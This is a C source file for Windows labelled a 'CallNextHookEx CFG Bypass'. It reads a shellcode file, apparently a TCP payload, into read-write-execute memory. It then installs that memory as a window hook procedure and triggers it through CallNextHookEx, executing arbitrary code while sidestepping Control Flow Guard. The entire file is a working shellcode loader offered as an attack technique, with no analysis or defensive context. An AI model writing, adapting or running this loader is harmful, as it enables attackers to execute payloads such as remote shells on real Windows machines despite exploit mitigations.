#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

int main(void) {
    printf("=== CallNextHookEx CFG Bypass ===\n");
    FILE* f = fopen("tcp_windows_amd64.bin", "rb");
    if (!f) { printf("[-] shellcode not found\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* sc = (unsigned char*)VirtualAlloc(
        NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!sc) { printf("[-] VirtualAlloc failed\n"); fclose(f); return 1; }
    fread(sc, 1, len, f);
    fclose(f);
    printf("[+] Shellcode: %ld bytes @ %p\n", len, sc);

    HHOOK hhk = SetWindowsHookExA(WH_GETMESSAGE, (HOOKPROC)sc,
                                    NULL, GetCurrentThreadId());
    if (!hhk) {
        printf("[-] SetWindowsHookExA failed (%lu)\n", GetLastError());
        VirtualFree(sc, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Hook installed: %p\n", hhk);
    printf("[*] Calling CallNextHookEx...\n");
    fflush(stdout);
    LRESULT r = CallNextHookEx(hhk, 0, 0, 0);
    printf("[+] CallNextHookEx returned: %lld\n", (long long)r);
    UnhookWindowsHookEx(hhk);
    VirtualFree(sc, 0, MEM_RELEASE);
    return 0;
}
